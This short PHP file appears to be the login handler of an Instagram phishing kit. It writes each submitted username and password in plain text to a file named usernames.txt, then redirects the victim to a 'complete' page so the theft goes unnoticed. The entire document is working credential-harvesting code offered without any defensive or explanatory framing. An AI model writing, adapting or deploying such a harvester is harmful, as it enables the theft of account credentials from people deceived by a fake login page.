<?php

	file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
	$url = explode('insta/login.php', $_SERVER['PHP_SELF'])[0].'complete.html';
	header('Location: ' . $url);
	exit();
?>